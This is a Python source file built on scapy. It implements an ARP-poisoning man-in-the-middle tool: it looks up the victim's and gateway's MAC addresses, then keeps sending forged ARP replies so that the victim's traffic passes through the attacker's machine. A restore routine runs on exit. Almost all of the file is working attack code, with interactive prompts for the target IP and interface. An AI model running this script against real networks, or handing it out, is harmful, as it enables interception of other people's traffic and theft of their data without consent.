from scapy.all import *
import sys
import os
import time
import netifaces # pip install netifaces

class RotMiTM:
  def getTargetMAC(self,ip, interface):
    conf.verb=0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout=2, iface=interface, inter=0.1)
    for send,recv in ans:
      return recv.sprintf(r'%Ether.src%')

  def poison(self, victimIP, victimMAC, gatewayIP, gatewayMAC):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = gatewayMAC))

  def cure(self,victimIP, victimMAC, gatewayIP, gatewayMAC):
    print "[+] Restoring MAC tables..."
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[+] IP Forwarding Disabled"
    print "[*] Network cured, quitting..."
    sys.exit(1)

  def startupQuiz(self):
    gws=netifaces.gateways()['default'][netifaces.AF_INET][0]
    availableInterfaces=netifaces.interfaces()
    try:
      interface = raw_input("[+] Interface ["+availableInterfaces[-1]+"]: ")
      if interface == "":
        interface=availableInterfaces[-1]
      victimIP = raw_input("[+] Target IP to intercept [127.0.0.1]: ")
      if victimIP == "":
        victimIP='127.0.0.1'
      gatewayIP = raw_input("[+] Gateway IP ["+gws+"]: ")
      if gatewayIP == "":
        gatewayIP = gws
      return interface, victimIP, gatewayIP 
    except KeyboardInterrupt:
      print "\n[+] Keyboard Interrupt, quitting..."
      sys.exit(1)

  def rot(self,victimIP, gatewayIP, interface):
    try:
      victimMAC = self.getTargetMAC(victimIP, interface)
      gatewayMAC = self.getTargetMAC(gatewayIP, interface)
    except Exception as e:
      print "[-] MAC addresses not found, quitting..."
      os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
      print "[+] IP Forwarding Disabled"
      sys.exit(1)

    print "[+] Poisoning..."
    while 1:
      try:
        self.poison(victimIP, victimMAC, gatewayIP, gatewayMAC)
        time.sleep(1.5)
      except KeyboardInterrupt:
        self.cure(victimIP, victimMAC, gatewayIP, gatewayMAC)
        break
